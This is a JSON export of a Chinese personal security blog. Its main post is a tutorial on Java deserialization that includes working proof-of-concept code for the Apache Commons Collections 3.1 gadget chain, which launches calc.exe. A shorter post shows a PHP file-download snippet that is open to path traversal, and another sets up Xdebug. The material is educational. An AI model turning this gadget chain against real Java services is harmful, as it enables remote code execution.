{"meta":{"title":"Whippet's Blog","subtitle":"","description":"","author":"whippet","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-08-28T08:36:42.000Z","updated":"2020-08-29T14:13:55.325Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-08-28T08:36:56.000Z","updated":"2020-08-29T14:14:13.653Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"","slug":"函数总结","date":"2020-08-28T09:19:33.546Z","updated":"2020-08-29T15:58:05.732Z","comments":true,"path":"2020/08/28/函数总结/","link":"","permalink":"http://yoursite.com/2020/08/28/%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93/","excerpt":"","text":"PHP 相关函数 任意文件下载 fread() fread() 函数读取文件（可安全用于二进制文件）fread(file,length) 参数 描述 file 必需。规定要读取打开文件。 length 必需。规定要读取的最大字节数。 123456789101112131415$path = &quot;../&#123;$file&#125;&quot;;$handle = fopen($path, &quot;r&quot;);header(&quot;Pragma: &quot;);header(&quot;Cache-Control: &quot;);header(&quot;Content-type: application/octet-stream; charset=utf-8&quot;);header(&quot;Content-Disposition: attachment; filename=\\&quot;&#123;$name&#125;\\&quot;&quot;);if ($handle) &#123; while (!feof($handle)) &#123; $read = fread($handle, 4096); print($read); &#125;&#125;pclose($handle); 变量覆盖 extrat() extract() 从数组中将变量导入到当前的符号表","categories":[],"tags":[]},{"title":"通达oa漏洞分析","slug":"通达oa漏洞分析/通达oa漏洞分析","date":"2020-08-28T06:57:24.000Z","updated":"2020-08-28T07:06:29.295Z","comments":true,"path":"2020/08/28/通达oa漏洞分析/通达oa漏洞分析/","link":"","permalink":"http://yoursite.com/2020/08/28/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"phpstorm进行PHP断点调试","slug":"phpstorm进行PHP断点调试","date":"2020-08-20T07:19:41.000Z","updated":"2020-08-29T15:58:05.731Z","comments":true,"path":"2020/08/20/phpstorm进行PHP断点调试/","link":"","permalink":"http://yoursite.com/2020/08/20/phpstorm%E8%BF%9B%E8%A1%8CPHP%E6%96%AD%E7%82%B9%E8%B0%83%E8%AF%95/","excerpt":"配置环境 phpstromphpstudy","text":"配置环境 phpstromphpstudy phpstrom 配置 php 环境 PHP安装xdebug扩展 注意版本：此时我们 php 的版本为 php5.6.9xdebug模块https://xdebug.org/files/php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll 把下载成功的 php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll放在 E:\\Tools\\phpstudy_pro\\Extensions\\php\\php5.6.9nts\\ext 文件夹下 12345678910111213[xdebug]zend_extension&#x3D;&quot;E:&#x2F;Tools&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php5.6.9nts&#x2F;ext&#x2F;php_xdebug-2.5.5-5.6-vc11-nts-x86_64.dll&quot; ;指定Xdebug扩展文件的绝对路径xdebug.auto_trace&#x3D;on ;启用代码自动跟踪xdebug.collect_params&#x3D;on ;允许收集传递给函数的参数变量xdebug.collect_return&#x3D;on ;允许收集函数调用的返回值xdebug.trace_output_dir&#x3D;&quot;E:&#x2F;Tools&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;tmp&#x2F;xdebug&quot; ;指定堆栈跟踪文件的存放目录xdebug.profiler_enable&#x3D;on ;是否启用Xdebug的性能分析，并创建性能信息文件xdebug.profiler_output_dir&#x3D;&quot;E:&#x2F;Tools&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;tmp&#x2F;xdebug&quot; ;指定性能分析信息文件的输出目录xdebug.remote_enable &#x3D; on ;是否开启远程调试xdebug.remote_handler &#x3D; dbgp ;指定远程调试的处理协议xdebug.remote_host&#x3D; localhost ;指定远程调试的主机名xdebug.remote_port &#x3D; 9000 ;指定远程调试的端口号xdebug.idekey &#x3D; PHPSTORM ;指定传递给DBGp调试器处理程序的IDE Key PHPStrom 配置 debug 环境 配置 Debug 端口 配置IDEKEY 配置Server 配置PHP Web Application 浏览器的xdebug插件 测试调试 加上断点，同时把小电话设置成为绿色的浏览器上的插件打开，同时访问要调试的页面 调试单个文件 调试单个文件时 配置PHP Web Application点击绿色的小虫子就可以进行调试了 就可以进行愉快的调式了！","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-16T13:31:50.000Z","updated":"2020-08-29T15:58:05.717Z","comments":true,"path":"2020/08/16/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/16/hello-world/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"初识Java 反序列化","slug":"Java反序列化","date":"2020-08-16T13:31:50.000Z","updated":"2020-08-29T15:58:05.730Z","comments":true,"path":"2020/08/16/Java反序列化/","link":"","permalink":"http://yoursite.com/2020/08/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。","text":"初识Java 反序列化 What 什么是序列化与反序列化 java 序列化可以将一个对象序列化成JVM认识的字节序列，字节序列中包含了对象的数据，主要以对象属性为主。 java 反序列化是指把字节序列恢复为java对象的过程。利用在A平台上序列化产生的字节序列，可以在B平台上反序列化出同样的对象。 Why 为什么要用序列化与反序列化 实现了数据的持久化，通过序列化可以把数据永久的保存在硬盘上。 利用序列化实现远程通信，即在网络上传送对象的字节序列。 How 如何实现序列化与反序列化 JDK类库中序列化API 使用到JDK中关键类 ObjectOutputStream(对象输出流) 和ObjectInputStream(对象输入流) ObjectOutputStream 类中：通过使用 writeObject(Object object) 方法，将对象以二进制格式进行写入。 ObjectInputStream 类中：通过使用 readObject（）方法，从输入流中读取二进制流，转换成对象。 序列化一个对象 被序列化的类必须要实现 Serializable 接口，否则将无法序列化对象。 1234public class User implements Serializable &#123; public String name; public int age;&#125; 12345678910111213141516public class Main &#123; public static void main(String[] args) throws IOException &#123; User user =new User(); user.age = 18; user.name = &quot;whippet&quot;; PrintStream out = System.out; ObjectOutputStream objectOutputStream = new ObjectOutputStream(out); objectOutputStream.writeObject(user); objectOutputStream.flush(); objectOutputStream.close(); &#125;&#125; 序列化对象时使用对象输出流”ObjectOutputStream”，往指定输出流里写入 User 对象，使用控制台，可以直观的看到对象序列化后的样子。 �� \u0005sr Simple.User��Gm|\u0007X\u001d\u0002 \u0002I \u0003ageL \u0004namet \u0012Ljava/lang/String;xp \u0012t \u0007whippet 反序列化对象 将对象序列化成byte数组。再用”ObjectInputStream”反序列化回来。 12345678910111213141516171819202122232425262728public class Main &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; User user =new User(); user.age = 18; user.name = &quot;whippet&quot;; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流 ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(user);//序列化对象 objectOutputStream.flush(); objectOutputStream.close(); byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流 ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Object o = objectInputStream.readObject(); //将byte数组输入流反序列化 System.out.println(o); &#125;&#125; 输出这个反序列化后的对象，和一开始为 User 对象设定的属性值完全相同。同时Java为我们提供了自定义writeObject()、readObject()方法的功能，我们在目标类中自定义writeObject()、readObject()方法之后，将会首先调用我们自定义的方法，然后在继续执行原有的方法步骤. 1234567891011121314151617181920public class User implements Serializable &#123; public String name; public int age; @Override public String toString() &#123; return &quot;User&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, age=&quot; + age + &#x27;&#125;&#x27;; &#125; private void readObject(java.io.ObjectInputStream in)throws IOException,ClassNotFoundException &#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;&#125; User 类写一个 readObject 方法上去，当对象被反序列化的时候，该方法就会被调用。 序列化时仅能序列化对象的属性，并不能控制方法中的reObject的代码，所有漏洞的构造需要引入新的jar包 commons-collections-3.1反序列化漏洞 漏洞利用 利用maven 安装依赖 12345678&lt;dependencies&gt; &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;commons-collections&#x2F;commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;&#x2F;groupId&gt; &lt;artifactId&gt;commons-collections&lt;&#x2F;artifactId&gt; &lt;version&gt;3.1&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class Pocexec &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;) &#125;; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(&quot;value&quot;, &quot;value&quot;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); onlyElement.setValue(&quot;foobar&quot;); &#125;&#125; 漏洞分析 java.lang.Runtime#exec(java.lang.String)在exec处添加断点 查看调用链 最终遍历了”outerMap”这个Map对象的 Entry 集合，然后执行了 Entry 对象的的 setValue 方法导致执行了反射链。所以先查看 outerMap 的实现类 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 调用了方法org.apache.commons.collections.map.TransformedMap#decorate这个静态方法又去new了一个TransformedMap对象。map传入的是一个普通的数据，valueTransformer则是构造的调用链。org.apache.commons.collections.map.TransformedMap#TransformedMap实例化对象成功后依次调用了四个方法 entrySet() iterator() next() setValue() 在类 TransformedMap中未找到定义的 entrySet()方法，在他的父类AbstractInputCheckedMapDecorator 中找org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#entrySetnew 了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetEntrySet类中的iterator方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iterator又new了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIteratorEntrySetIterator类中的next方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySetIterator#next又new了一个内部类org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntryMapEntry类中的setValue方法org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue第一行调用了checkSetValue方法，此处的parent来自所以实际上调用为 org.apache.commons.collections.map.TransformedMap#checkSetValue调用了valueTransformer 的transform方法所以首先调用了org.apache.commons.collections.functors.ChainedTransformer#transform循环调用数组每一个对象的transform方法，并传入object对象，再将执行结果赋值给object对象[0]是ConstantTransformer对象，它会返回new时候的参数中的Object对象，这里也是就是”java.Runtime”[1]-[3]是InvokerTransformer对象，调用的是反射的代码 iTransformers的值是在初始化构建ChainedTransformer时生成org.apache.commons.collections.functors.ChainedTransformer#ChainedTransformerConstantTransformer类中实现transform方法org.apache.commons.collections.functors.ConstantTransformer#transformInvokerTransformer类中实现了transform方法org.apache.commons.collections.functors.InvokerTransformer#transform 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; &#125; (“getMethod”, new Class[] {String.class, Class[].class }, new Object[] {“getRuntime”, new Class[0] })iMethodName = “getMethod”;iParamTypes = new Class[] {String.class, Class[].class } ;iArgs = new Object[] {“getRuntime”, new Class[0] } 123456789101112public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; ......&#125; 第一个参数”getMethod”是这个函数的名字 第二个参数new Class[]{String.class, Class[].class}是getMethod的2个参数参数类型，一个是String，一个是class[] 第三个参数new Object[]{“getRuntime”, new Class[0]}是getMethod的2个参数值，一个是getRuntime，一个是空，因为是数组形式所以要这么写 getMethod(&lt;String&gt; “getRuntime”, &lt;Class[]&gt; null)invoke(&lt;Object&gt;null, &lt;Object[]&gt;null)exec(&lt;String&gt;“”calc.exe””) 就是通过反射去调用Runtime.getRuntime().exec(“calc.exe”) Java反射机制 java中执行系统命令的方法为 123456public class Exec &#123; public static void main(String[] args)throws Exception&#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;&#125; 正常的执行步骤为 123456public class Exec &#123; public static void main(String[] args)throws Exception&#123; Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;calc&quot;); &#125; &#125; 相对应的反射代码为 123456public class Exec &#123; public static void main(String[] args)throws Exception&#123; Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new Class[]&#123;&#125;).invoke(null); Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;calc&quot;); &#125;&#125; Method Class.getMethod(String name, Class&lt;?&gt;… parameterTypes)的作用是获得对象所声明的公开方法。该方法的第一个参数name是要获得方法的名字，第二个参数parameterTypes是按声明顺序标识该方法形参类型。 getMethod(方法名, 方法类型)Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new Class[]&#123;&#125;).invoke(null);等价于Object runtime = java.lang.Runtime.getRuntime() person.getClass().getMethod(“Speak”, null);获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null person.getClass().getMethod(“run”, String.class);获得person对象的run方法，因为run方法的形参是String类型的，所以parameterTypes为String.class Method Class.invoke(Object obj, Object… args)invoke(某个对象实例， 传入参数) Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;calc&quot;);等价于 runtime.exec(&quot;calc&quot;);调用生成的runtime实例的exec方法，并将”clac”参数传入exec()方法 实际利用 对象是可以被反序列化，但并不在反序列化时触发调用链，而是要经过迭代器迭代并且使用 setValue() 方法才行，正常情况下基本不会有这种场景。 sun.reflect.annotation.AnnotationInvocationHandler该类中重写了readObject方法,在被调用时会执行setValue操作, 如果能把TransformedMap装入这个AnnotationInvocationHandler类就可以实现任意代码执行 利用代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable &#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc.exe&quot;&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(&quot;value&quot;, &quot;value&quot;); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //序列化 FileOutputStream fileOutputStream = new FileOutputStream(&quot;serialize3.txt&quot;); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //反序列化 FileInputStream fileInputStream = new FileInputStream(&quot;serialize3.txt&quot;); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); &#125;&#125; java.lang.Runtime#exec(java.lang.String)在exec处添加断点 查看调用链 sun.reflect.annotation.AnnotationInvocationHandler#readObject 传入的第一个参数 var1 必须为继承Annotation的子类，Annotation这个接口是所有注解类型的公用接口，所有注解类型都实现了这个接口。 java.lang.annotation.Retention.class java.lang.annotation.Target.class 否则在这个地方就return，不会继续向下执行了 传入的第二个参数 var2 则是构造的调用链同时map的键值必须为&quot;value&quot;，否则利用不成功，这是一处小细节~ Java 反序列化漏洞始末（1）— Apache Commons浅显易懂的JAVA反序列化入门手把手教你写JAVA反序列化的POC","categories":[],"tags":[]}],"categories":[],"tags":[]}